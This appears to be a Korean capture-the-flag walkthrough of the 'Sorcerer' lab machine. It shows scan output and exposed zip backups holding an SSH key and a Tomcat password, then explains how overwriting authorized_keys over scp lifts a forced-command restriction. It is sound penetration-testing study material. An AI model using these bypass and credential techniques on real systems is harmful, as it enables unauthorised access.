---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/exec/ssh-key
  - tech/enum/peas
  - tech/lin/suid
type: machine
platform: pg
os: linux
ip: 192.168.120.100
ports: [22, 80, 111, 2049, 7742, 8080, 33065, 35835, 42329, 43307]
services: [http, mountd, nfs, nlockmgr, rpcbind, ssh]
cves: [CVE-2017-12615, CVE-2017-12617, CVE-2021-22555]
status: solved
manual_tags: true
tech_count: 4
---
> [!info] PG Practice — Sorcerer · Intermediate · Linux (Debian 10)
> **타겟** 192.168.120.100 · **OS** Debian 10 (buster), 커널 4.19 계열 · **플래그 2개**
> **경로 요약** 7742 nginx 디렉터리 열거 → `/zipfiles/max.zip`에 **홈 디렉터리 백업(개인 SSH 키 포함)** → `authorized_keys`의 `command="scp_wrapper.sh"` 강제 명령에 갇힌 셸 → **그 제한 자체를 scp로 덮어써서 해제** → `max` 셸 → SUID `/usr/sbin/start-stop-daemon` → root
> **핵심 교훈** 강제 명령(forced command)은 **자기 자신이 적혀 있는 파일을 보호하지 못한다.**

## 0. 이 박스에서 배우는 것

- **웹루트에 놓인 백업 아카이브가 왜 치명적인가** — `.zip` 하나가 `id_rsa`·`authorized_keys`·앱 설정 백업을 동시에 준다. 크리덴셜 스터핑이 아니라 **파일 노출**이 foothold다
- **SSH `authorized_keys` 옵션 필드의 구조와 한계** — `command=`·`no-pty`·`no-port-forwarding`이 각각 무엇을 막고, **무엇을 못 막는가**
- **제한된 채널(scp 전용)로 그 제한을 해제하는 사고** — 이 박스의 전부다. "쓰기 권한이 있는 대상 중에 나를 가두는 규칙 파일이 포함돼 있는가"라는 질문
- **`scp -O`** — OpenSSH 9 이후 `scp`의 기본 전송 방식이 바뀌어서, **옛 서버·강제 명령 환경에서는 `-O` 없이는 조용히 실패**한다. 시험장에서 이 한 글자에 30분을 태울 수 있다
- **SUID 바이너리 열거와 GTFOBins 대조** — `start-stop-daemon`처럼 "관리용 도구"가 SUID로 남아 있으면 그대로 root다. `sh -p`의 의미까지
- **자동 도구(linpeas)를 썼을 때의 수동 대안** — `find / -perm -4000 -type f 2>/dev/null` 한 줄이면 같은 결론에 도달한다

> [!tip] 시험 출제 가능성
> | 요소 | 시험 출제 가능성 | 이유 |
> |---|---|---|
> | **웹에 방치된 백업/아카이브 파일** | **매우 높음** | `.zip`·`.tar.gz`·`.bak`·`.old`·`.swp`는 디렉터리 열거의 1순위 확장자다. 시험 박스의 foothold가 여기서 나오는 경우가 흔하다 |
> | **유출된 개인 SSH 키로 로그인** | **매우 높음** | 리눅스 박스의 정석 foothold. 이 노트의 `[[Slort]]`·`[[Astronaut]]` 계열과 같은 반사신경 |
> | **`command=` 강제 명령 우회** | 중간 | 그 자체는 흔치 않지만, **"제한된 원시(primitive)로 무엇을 할 수 있는가"** 라는 사고는 시험 전 구간에 적용된다. 파일 읽기만 되는 LFI, 쓰기만 되는 업로드도 같은 사고다 |
> | **SUID → GTFOBins** | **매우 높음** | 리눅스 권한상승의 기본. `find / -perm -4000`은 셸 잡고 3분 안에 친다 |
>
> 변형은 이런 모습이다 — zip 대신 `.git` 디렉터리 노출, `id_rsa` 대신 `.pgpass`·`.netrc`·`credentials.xml`, `start-stop-daemon` 대신 `env`·`python3.9`·`pkexec`. **원리는 동일하다.**

---

## 1. 정찰

### 1-1. Nmap — 원문

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.120.100
# Nmap 7.98 scan initiated Wed Jul  8 17:43:46 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.120.100
Nmap scan report for 192.168.120.100
Host is up (0.084s latency).
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
80/tcp    open  http     nginx
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      42329/tcp   mountd
|   100005  1,2,3      59704/udp   mountd
|   100021  1,3,4      33065/tcp   nlockmgr
|   100021  1,3,4      51595/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
7742/tcp  open  http     nginx
|_http-title: SORCERER
8080/tcp  open  http     Apache Tomcat 7.0.4
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.4
33065/tcp open  nlockmgr 1-4 (RPC #100021)
35835/tcp open  mountd   1-3 (RPC #100005)
42329/tcp open  mountd   1-3 (RPC #100005)
43307/tcp open  mountd   1-3 (RPC #100005)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   84.83 ms 192.168.45.1
2   84.75 ms 192.168.45.254
3   84.93 ms 192.168.251.1
4   85.07 ms 192.168.120.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  8 17:44:17 2026 -- 1 IP address (1 host up) scanned in 31.82 seconds
```

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | **이 박스는 `-p-` 없이는 풀리지 않는다.** 정답 서비스가 **7742**에 있다. 기본 스캔(top 1000)은 22/80/111/2049만 보여주고, 웹루트 백업도 Tomcat도 못 본다 |
| `-sCV` | 기본 NSE + 버전 탐지 | `Apache Tomcat 7.0.4`, `OpenSSH 7.9p1 Debian 10+deb10u2` 같은 **정확한 버전 문자열**이 안 나온다. `rpcinfo` NSE도 안 돌아서 **mountd/nfs_acl의 존재를 놓친다** |
| `-Pn` | ping 사전탐지 생략 | PG 랩은 ICMP를 막는 경우가 있다. 빼면 "host down"으로 오판 |
| `-A` | OS 추측 + traceroute | OS 추측이 `Linux 5.0 - 5.14`로 나왔는데 **이건 틀렸다** (실제로는 Debian 10 / 4.19 커널). 아래 경고 참조 |
| `--min-rate 5000` | 초당 최소 패킷 | 전수 스캔이 **31초**에 끝났다. 이 옵션 없이는 수십 분 |
| `-oN nmap.log` | 사람이 읽는 포맷 저장 | 재스캔 없이 다시 읽는다. 시험 리포트 증거로도 쓴다 |

> [!warning] `OS details: Linux 5.0 - 5.14`를 믿고 커널 익스플로잇을 고르지 마라
> nmap의 OS 지문은 **TCP/IP 스택 특성 추측**이다. 이 박스는 `OpenSSH 7.9p1 Debian 10+deb10u2` 배너가 **Debian 10 (buster)** 를 가리키고, buster의 표준 커널은 **4.19** 계열이다. 실제로 [[Pelican]]에서 같은 배너의 박스를 덤프해 보니 `4.19.0-10-amd64`였다.
> 즉 nmap의 `5.0 - 5.14`는 **오탐**이다. 이 오탐을 믿고 5.x 대상 커널 익스플로잇을 컴파일하면 시간을 버린다 — 실제로 이 박스에서 그렇게 됐다(6장 ⑤).
> **버전 판정은 독립 근거 2개** 규칙([[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]]). 커널 버전은 셸을 잡은 뒤 `uname -a`로 확정한다.

**이 스캔에서 읽어야 할 세 줄**

1. `7742/tcp open http nginx` + `http-title: SORCERER` — **비표준 포트의 커스텀 앱**. 80번의 nginx는 제목조차 없는데 7742는 박스 이름을 달고 있다. 여기가 본진이다
2. `2049/tcp open nfs` + `rpcinfo`에 mountd 3개 — NFS 익스포트가 존재한다. 리눅스 박스에서 NFS는 **`no_root_squash` 권한상승**의 단골 통로다
3. `8080/tcp open http Apache Tomcat 7.0.4` — **10년도 더 된 버전**. 반사적으로 `/manager/html`과 PUT 계열 CVE가 떠오른다 (2-6 참조)

### 1-2. 서비스 식별 — whatweb 원문

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ whatweb http://192.168.120.100:7742 | tee whatweb.log
http://192.168.120.100:7742 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx],
IP[192.168.120.100], PasswordField[password], Script, Title[SORCERER], nginx

┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ whatweb http://192.168.120.100:8080 | tee whatweb_8080.log
http://192.168.120.100:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[192.168.120.100],
Title[Apache Tomcat/7.0.4]
```

두 줄에서 얻는 것:

- 7742는 **`PasswordField[password]`** — 로그인 폼이 있다. 인증 우회/기본 자격증명/SQLi 후보
- 8080은 whatweb이 `HTTPServer` 헤더를 못 뽑았다. **Tomcat이 `Server:` 헤더를 안 보내도록 설정됐거나 nmap의 favicon 해시로만 판정된 것** [가정]. 버전 판정 근거가 **nmap의 title/favicon 하나뿐**이므로 신뢰도가 낮다 — 8080에 직접 붙어 기본 페이지 문구를 확인해야 확정이다

### 1-3. 7742 웹 앱 — 로그인 시도

홈페이지 접근:

![[Pasted image 20260710131947.png]]

기본 자격증명 `admin/admin`, `root/root` 시도 — 실패:

![[Pasted image 20260710132020.png]]

> [!warning] 로그인 폼을 보면 뚫으려 하기 전에 **뒤를 먼저 뒤진다**
> 폼이 보이면 무의식적으로 자격증명을 추측하게 된다. 그런데 커스텀 로그인 폼은 **소스·주변 디렉터리에 정답이 있는 경우가 훨씬 많다.**
> 순서: ① 페이지 소스 보기 → ② robots.txt / 주석 → ③ **디렉터리 열거** → ④ 그래도 없으면 자격증명 공략.
> 이 박스는 ③에서 끝났다. ④에 시간을 태웠다면 손해였다(6장 ①).

### 1-4. 디렉터리 열거 — `/zipfiles/` 발견

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ feroxbuster -u http://192.168.120.100:7742/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.120.100:7742/
 🚩  In-Scope Url          │ 192.168.120.100
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://192.168.120.100:7742/default => http://192.168.120.100:7742/default/
200      GET       65l      117w     1219c http://192.168.120.100:7742/
200      GET       65l      117w     1219c http://192.168.120.100:7742/index.html
200      GET        1l        3w       14c http://192.168.120.100:7742/default/index.html
301      GET        7l       12w      178c http://192.168.120.100:7742/zipfiles => http://192.168.120.100:7742/zipfiles/
200      GET       13l       81w     4749c http://192.168.120.100:7742/zipfiles/francis.zip
200      GET       13l       82w     4741c http://192.168.120.100:7742/zipfiles/miriam.zip
200      GET       39l      203w    13898c http://192.168.120.100:7742/zipfiles/max.zip
200      GET       13l       82w     4733c http://192.168.120.100:7742/zipfiles/sofia.zip
[###########>--------] - 10m   694231/1245789 8m      found:9       errors:0
[###########>--------] - 10m   347193/622887  552/s   http://192.168.120.100:7742/
[###########>--------] - 10m   346902/622887  552/s   http://192.168.120.100:7742/default/
[####################] - 0s    622887/622887  3261188/s http://192.168.120.100:7742/zipfiles/ => Directory listing (add --scan-dir-listings to scan)
```

![[Pasted image 20260710133159.png]]

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-u` | 대상 URL | — |
| `-w …directory-list-lowercase-2.3-medium.txt` | 워드리스트 | `zipfiles`는 흔한 단어가 아니다. `common.txt`(4.7k) 같은 소형 리스트에서는 **안 나올 가능성이 높다.** medium(220k) 이상을 쓴다 |
| `-t 50` | 동시 스레드 | 기본값보다 빠르지만 랩 네트워크에서 안정적인 상한. 너무 올리면 404 필터가 오작동한다 |
| `-x html,txt` | 확장자 추가 | 여기서는 결정적이지 않았다. **`-x zip,bak,tar.gz,old,sql`을 넣었다면 훨씬 빨리 끝났을 것이다** — 아래 tip |

> [!tip] 이 박스의 진짜 교훈 — 확장자 리스트에 **아카이브·백업**을 넣어라
> 정답 파일은 `.zip`이었다. `-x html,txt`로는 `zipfiles` **디렉터리**를 우연히 맞춰야만 발견된다.
> 다음부터는 이렇게 친다:
> ```bash
> feroxbuster -u http://TARGET:PORT/ \
>   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
>   -x zip,tar,tar.gz,bak,old,sql,txt,conf,php,html -t 50
> ```
> 그리고 **디렉터리 리스팅이 켜진 경로를 만나면 무조건 브라우저로 직접 연다.** feroxbuster는 마지막 줄에서 그걸 알려줬다:
> `http://192.168.120.100:7742/zipfiles/ => Directory listing (add --scan-dir-listings to scan)`

> [!danger] feroxbuster는 **디렉터리 리스팅을 기본적으로 재귀 스캔하지 않는다**
> 위 마지막 줄이 그 경고다. `--scan-dir-listings`을 주지 않으면 리스팅 안의 파일은 워드리스트에 그 이름이 있을 때만 잡힌다.
> **여기서는 운 좋게 `francis`·`miriam`·`max`·`sofia`가 사람 이름 워드리스트에 있었다.** 이름이 특이했다면 `zipfiles/` 디렉터리만 찾고 내용물은 못 봤을 수 있다.
> **스캐너가 "디렉터리 리스팅"이라고 말하면 사람이 직접 눈으로 연다.** 이건 스캐너 함정의 전형이다.

### 1-5. 아카이브 내용 — 홈 디렉터리 통째로

네 개를 전부 내려받는다:

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ wget http://192.168.120.100:7742/zipfiles/{francis,miriam,max,sofia}.zip
┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ for f in *.zip; do echo "== $f"; unzip -o -q "$f"; done
```

![[Pasted image 20260710132345.png]]

**크기가 답을 알려준다.** `max.zip`만 13,898바이트고 나머지 셋은 4,7xx바이트다. 4.7KB는 `.bashrc`(3.5KB)+`.profile`(807B)+`.bash_logout`(220B), 즉 **빈 홈 디렉터리의 스켈레톤 파일뿐**이다. `max.zip`의 9KB 초과분이 바로 **추가 파일** — 그게 SSH 키다.

> [!tip] 열거 결과에서 **크기가 튀는 항목을 먼저 연다**
> 같은 종류 파일이 여럿일 때 크기 차이는 "여기에 뭔가 더 들어 있다"는 신호다. 4개를 순서대로 열지 말고 **13898부터 연다.** 시험장에서 몇 분을 아낀다.

압축을 풀면 `max`의 홈 디렉터리가 통째로 나온다:

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ ls -la max/ max/.ssh/
max/:
-rwxrw-rw-  1 kali kali  220 Apr 18  2019 .bash_logout
-rwxrw-rw-  1 kali kali 3526 Apr 18  2019 .bashrc
-rwxrw-rw-  1 kali kali  807 Apr 18  2019 .profile
-rwxrw-rw-  1 kali kali  133 Sep 25  2020 scp_wrapper.sh
drwxrwxr-x  2 kali kali 4096 Jul 10 14:01 .ssh
-rwxrw-rw-  1 kali kali 1991 Sep 25  2020 tomcat-users.xml.bak

max/.ssh/:
-rw------- 1 kali kali  738 authorized_keys
-rw------- 1 kali kali 3381 id_rsa
-rw------- 1 kali kali  738 id_rsa.pub
```

![[Pasted image 20260710132554.png]]

**개인 키가 그대로 있다:**

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ head -1 id_rsa; tail -1 id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
-----END OPENSSH PRIVATE KEY-----
```

키 주석이 소유자를 알려준다 — `max@sorcerer`:

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
```

**같은 아카이브가 준 두 번째 선물** — Tomcat manager 자격증명:

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max]
└─$ cat tomcat-users.xml.bak
...
  <role rolename="manager-gui"/>
  <user username="tomcat" password="VTUD2XxJjf5LPmu6" roles="manager-gui"/>
</tomcat-users>
```

> [!note] `manager-gui` 롤만 있다 — WAR 배포는 안 된다
> Tomcat의 manager 애플리케이션은 롤이 넷으로 쪼개져 있다:
> - `manager-gui` — HTML 화면 접근
> - `manager-script` — `/manager/text` API (**`curl -T app.war` 배포는 이 롤이 필요**)
> - `manager-jmx` · `manager-status` — 모니터링
>
> 이 계정은 `manager-gui`뿐이므로 **화면에서 WAR 업로드는 가능하지만 스크립트 배포는 막힌다.** 시험에서 Tomcat 자격증명을 얻으면 **먼저 롤을 확인**하라 — 어느 공격 경로가 열려 있는지가 롤로 결정된다.

### 1-6. NFS는 팠는가 — 정직한 기록

`2049/tcp nfs`가 열려 있고 mountd가 셋이나 떠 있는데, **이 박스의 산출물에는 `showmount` 결과가 남아 있지 않다.** 실제로 익스포트를 열거했는지 확인할 수 없으므로 **결과를 지어내지 않는다.**

같은 상황을 다시 만나면 다음 두 줄이 첫 수다:

```bash
showmount -e 192.168.120.100          # 익스포트 목록
mount -t nfs 192.168.120.100:/EXPORT /mnt/nfs -o vers=3,nolock
```

> [!warning] NFS는 이 박스에서 **훨씬 짧은 길이었을 수 있다** [가정]
> `/home`이 익스포트돼 있었다면 zip을 거치지 않고 `max`의 `.ssh`를 바로 읽었을 것이고, `no_root_squash`였다면 SUID 바이너리를 직접 심어 권한상승까지 한 번에 갔을 것이다.
> **확인하지 않았으므로 단정하지 않는다.** 다만 "열린 NFS를 보고 열거하지 않았다"는 것 자체가 정찰 누락이다.

---

## 2. 취약점 분석

> [!abstract] 이 박스에 CVE는 없다
> 취약점은 셋 다 **오설정과 신뢰 경계 설계 오류**다.
> ① 웹루트에 홈 디렉터리 백업 배포 → ② 강제 명령이 자기 자신을 보호하지 못함 → ③ 관리 도구가 SUID로 방치.
> CVE 번호가 없는 취약점이 시험에 더 많이 나온다. **메커니즘을 이해해야 응용이 된다.**

### 2-1. 배경 지식 ① — 왜 "백업 파일 노출"이 크리덴셜 유출인가

정적 웹서버는 **디렉터리 안의 파일을 종류를 가리지 않고 그대로 준다.** nginx의 `autoindex on;` 은 거기에 **목록까지** 붙여준다. 개발자가 "백업은 사람만 볼 테니까"라고 생각한 순간 그 파일은 **인증 없는 전 세계 공개**가 된다.

홈 디렉터리 백업이 특히 나쁜 이유는 홈에 들어 있는 것들 때문이다:

| 파일 | 무엇을 주는가 |
|---|---|
| `.ssh/id_rsa` | **그 사용자로 로그인하는 자격증명 그 자체** |
| `.ssh/authorized_keys` | 어떤 키가 허용되는지 + **적용된 제한 옵션**(이 박스의 핵심) |
| `.bash_history` | 실행한 명령, 종종 인라인 패스워드 |
| `.netrc` · `.pgpass` · `.git-credentials` | 평문 자격증명 |
| `*.bak` 앱 설정 | 이 박스의 `tomcat-users.xml.bak` |

> [!tip] 웹에서 아카이브를 받으면 **반드시 전부 푼다**
> `max.zip` 하나에서 ① SSH 개인키 ② 강제 명령 설정 ③ Tomcat 패스워드가 나왔다. 첫 번째만 보고 멈추면 나머지를 놓친다.
> `unzip -l`로 목록부터 보고, `.` 으로 시작하는 **숨은 파일이 포함돼 있는지** 확인하라 (`ls`만 하면 `.ssh`가 안 보인다).

### 2-2. `authorized_keys` 옵션 필드 해부

키를 얻었으니 바로 붙으면 될 것 같지만, **같은 아카이브에 들어 있던 `authorized_keys`가 함정을 미리 알려준다**:

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ cat authorized_keys
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohn...(생략)... max@sorcerer
```

`authorized_keys`의 한 줄은 **`[옵션,옵션,...] 키타입 키본문 주석`** 구조다. 옵션 필드는 **그 키로 인증했을 때만** 적용되는 서버측 제약이다:

| 옵션 | 무엇을 막는가 | 이 박스에서의 의미 |
|---|---|---|
| `no-port-forwarding` | `-L`/`-R` 터널 | 포트포워딩으로 내부 서비스에 못 붙는다 |
| `no-X11-forwarding` | X11 포워딩 | 사실상 무의미 |
| `no-agent-forwarding` | 에이전트 포워딩 | 키 재사용 차단 |
| **`no-pty`** | **의사 터미널 할당 거부** | `ssh -t`를 줘도 **대화형 셸이 안 뜬다** |
| **`command="/home/max/scp_wrapper.sh"`** | **강제 명령** | 사용자가 무엇을 요청하든 **서버는 이 스크립트만 실행한다.** 사용자가 보낸 원래 명령은 환경변수 `SSH_ORIGINAL_COMMAND`에 담겨 스크립트에 전달된다 |

그리고 그 스크립트:

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max]
└─$ cat scp_wrapper.sh
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
```

**데이터 흐름을 한 줄씩 따라간다:**

1. 클라이언트가 `ssh -i id_rsa max@target '<명령>'` 을 보낸다
2. sshd가 키를 검증하고, `command=` 가 있으므로 **클라이언트의 `<명령>`을 버리고** `/home/max/scp_wrapper.sh`를 실행한다
3. 버려진 원래 명령은 `SSH_ORIGINAL_COMMAND` 환경변수로 스크립트에 넘어간다
4. 스크립트는 그 문자열이 **`scp`로 시작하는지만** 본다
5. 시작하면 `$SSH_ORIGINAL_COMMAND`를 **따옴표 없이** 실행한다. 아니면 `ACCESS DENIED.`

즉 **의도된 기능은 "이 키는 scp 파일 전송 전용"** 이다.

> [!note] `case`의 패턴이 `'scp'*` 라는 점
> 셸 `case`의 `'scp'*`는 **"scp로 시작하는 임의 문자열"** 이다. `scp -t /home/max/x` 도, `scp` 뒤에 무엇이 붙어도 통과한다.
> `$SSH_ORIGINAL_COMMAND`가 **인용되지 않은 채** 실행되므로 셸 단어 분리와 글로빙이 그대로 일어난다. 여기에 `;`나 `&&`를 끼워 넣는 명령 주입을 떠올리는 것이 자연스럽지만 — **이 박스는 그럴 필요조차 없었다.** 더 단순한 길이 있다(2-3).

### 2-3. 왜 이 제한이 스스로를 무너뜨리는가 — 이 박스의 핵심

`command=`는 **어떤 프로그램이 실행되는지**를 통제한다. 그런데 이 설계에는 구멍이 있다:

> **허용된 그 프로그램이 `authorized_keys` 자체를 덮어쓸 수 있다면, 제한은 자기 자신을 지키지 못한다.**

`scp`는 임의 경로에 파일을 쓴다. `max`는 `/home/max/.ssh/authorized_keys`의 소유자다. 따라서:

```
scp 전용 채널  →  /home/max/.ssh/authorized_keys 덮어쓰기  →  옵션 필드 제거  →  다음 접속은 완전한 셸
```

옵션 필드만 지운 새 파일을 만든다 (**키 본문은 그대로 둔다** — 우리가 가진 개인키에 대응해야 하므로):

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
```

> [!danger] 일반화 — "제한된 원시(primitive)"를 만나면 **그 원시로 제한 자체를 건드릴 수 있는지** 먼저 본다
> 같은 사고가 반복해서 나온다:
> - **쓰기만 되는 원시** → `~/.ssh/authorized_keys`(내 키 추가) · `~/.bashrc`(다음 로그인 시 실행) · `/etc/passwd`(해시 삽입) · cron 파일
> - **읽기만 되는 원시(LFI)** → `/proc/self/environ` · 로그 포이즈닝 · 설정 파일의 DB 자격증명
> - **명령 하나만 되는 sudo 항목** → GTFOBins에서 그 바이너리의 탈출 구문
>
> 질문은 항상 같다: **"내가 건드릴 수 있는 것 중에 나를 가두는 규칙이 들어 있는가?"**

> [!warning] `authorized_keys`를 덮어쓸 때 두 가지를 지켜라
> 1. **키 본문을 바꾸지 마라.** 우리가 가진 `id_rsa`에 대응하는 공개키여야 한다. 지울 것은 **앞의 옵션 필드뿐**이다
> 2. **퍼미션.** sshd는 `StrictModes yes`(기본값)에서 `~/.ssh`가 그룹/타인 쓰기 가능하면 키를 **거부**한다. scp는 원본 파일의 모드를 보존하므로 로컬에서 `chmod 600 authorized_keys`를 유지한 채 올린다

### 2-4. `scp -O` — OpenSSH 9 이후 반드시 알아야 하는 플래그

여기서 현대 Kali의 함정이 하나 나온다.

전통적으로 `scp`는 **원격에서 `scp -t`(수신 모드)/`scp -f`(송신 모드)를 실행**해 그 표준입출력으로 파일을 흘려보내는 방식이었다(레거시 SCP/rcp 프로토콜). 그래서 `scp_wrapper.sh`의 `case 'scp'*` 검사가 통과된다 — 서버가 받는 `SSH_ORIGINAL_COMMAND`가 실제로 `scp -t ...` 로 시작하기 때문이다.

**OpenSSH 9.0부터 `scp`는 기본적으로 SFTP 프로토콜을 쓴다.** 릴리스 노트 원문:

> This release switches scp(1) from using the legacy scp/rcp protocol to using the SFTP protocol by default. … the scp(1) client may be instructed to use the legacy scp/rcp using the `-O` flag.

(정확히는 **8.7**에서 `-s` 플래그로 SFTP를 실험적으로 넣었고, **9.0**에서 기본값을 뒤집으며 `-s`를 없애고 `-O`를 탈출구로 남겼다.)

그러면 서버가 받는 요청은 `scp -t ...` 명령이 아니라 **`sftp` 서브시스템 요청**이 되고, 이 래퍼의 `case` 분기는 `*`(기본)로 떨어져 **`ACCESS DENIED.`** 를 뱉는다.

`-O`가 그것을 되돌린다 — `scp(1)` man page 원문:

![[Pasted image 20260710135852.png]]

```
-O   Use the legacy SCP protocol for file transfers instead of the SFTP protocol.
     Forcing the use of the SCP protocol may be necessary for servers that do not
     implement SFTP, for backwards-compatibility for particular filename wildcard
     patterns and for expanding paths with a '~' prefix for older SFTP servers.
```

> [!note] 강제 명령은 scp에도 sftp에도 **똑같이** 걸린다
> `sshd(8)`의 `command=` 설명에 한 문장이 박혀 있다: *"Note that this option applies to shell, command or subsystem execution."*
> - `scp` 레거시 모드 → **command 실행** (`scp -t /path`) → `SSH_ORIGINAL_COMMAND`에 그 문자열이 들어온다
> - `sftp` → **subsystem 실행** → `SSH_ORIGINAL_COMMAND`가 `sftp` 가 된다
>
